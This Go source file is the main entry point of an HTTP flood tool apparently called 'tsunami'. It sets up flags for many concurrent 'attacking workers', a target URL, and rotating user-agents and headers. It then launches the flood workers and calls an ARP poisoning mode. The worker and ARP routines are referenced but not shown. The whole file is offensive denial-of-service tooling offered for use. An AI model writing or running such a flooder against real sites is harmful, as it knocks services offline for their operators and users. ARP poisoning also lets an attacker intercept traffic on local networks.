package main

import (
	"fmt"
	"log"
	"net/url"

	"gopkg.in/alecthomas/kingpin.v2"
)

//Command line args
var (
	verbose         = kingpin.Flag("verbose", "Verbose mode.").Short('v').Bool()
	maxWorkers      = kingpin.Flag("workers", "Amount of concurrent attacking workers (threads).").Default("8").Short('w').Int()
	maxRequests     = kingpin.Flag("max-requests", "Amount requests to send before exiting.").Default("-1").Short('m').Int()
	maxSeconds      = kingpin.Flag("max-seconds", "Amount of seconds before tsunami force closes.").Default("-1").Short('s').Int()
	displayInterval = kingpin.Flag("interval", "Interval in milliseconds between display of attack stats.").Default("1000").Short('i').Int()
	userAgentFile   = kingpin.Flag("user-agents", "Path of file containing newline(0x0a) seperated user agents.").Default("user-agents.txt").String()
	headersFile     = kingpin.Flag("headers", "Path of file containing newline(0x0a) seperated headers.").Default("headers.txt").String()
	target          = kingpin.Arg("url", "Target URL e.g http://google.com").Required().String()
	method          = kingpin.Arg("method", "HTTP method used for flood.").Default("GET").String()
	body            = kingpin.Arg("body", "Body of request, useful for POST/PUT.").Default("").String()
	arp_status      = kingpin.Arg("poison", "ARP Poison Mode, this is a side tool from the HTTP flood.").Default("").String()
)

var (
	requestCounter    int
	workerCounter     int
	workerDeadCounter int
	exitChan          chan int
	requestChan       chan bool
	workers           map[int]*floodWorker
	scheme            string
	lastErr           string
	tokenizedTarget   tokenizedString
	tokenizedBody     tokenizedString
)

func main() {

	//Parse arguments
	kingpin.Parse()
	u, err := url.Parse(*target)

	if err != nil {
		log.Fatal("URL Invalid")
	}

	// determine HTTP/HTTPS schema
	if !((u.Scheme == "http") || (u.Scheme == "https")) {
		// if neither, exit
		log.Fatal(fmt.Sprintf("URL scheme (%s) unsupported", u.Scheme))
	}
	scheme = u.Scheme

	//URL and body may contain dynamic tokens
	tokenizedTarget = *NewTokenizedString(*target)
	tokenizedBody = *NewTokenizedString(*body)

	//Reflect arguments
	if *verbose {
		fmt.Printf("URL => %s\n", *target)
		fmt.Printf("Workers => %d\n", *maxWorkers)
	}

	//Initiate stuff
	exitChan = make(chan int)
	requestChan = make(chan bool)
	workers := map[int]*floodWorker{}

	// load user agents and headers
	loadUserAgents()
	loadHeaders()

	//Start flood workers
	for workerCounter < *maxWorkers {
		// bind worker to object
		workers[workerCounter] = &floodWorker{
			exitChan: exitChan,
			id:       workerCounter,
		}

		// if verbose flag set
		if *verbose {
			// return start of thread and worker #
			fmt.Printf("Thread %d started\n", workerCounter)
		}

		// start the worker and send data stream
		workers[workerCounter].Start()
		// increment worker #
		workerCounter += 1
	}

	//Misc workers
	go Outputter()
	// handles max # of requests
	go MaxRequestEnforcer()
	// handles min # of requests
	go MaxSecondsEnforcer()
	// handler for worker deaths
	WorkerOverseer()

	// ARP Poison Mode
	arp_tsunami()
}
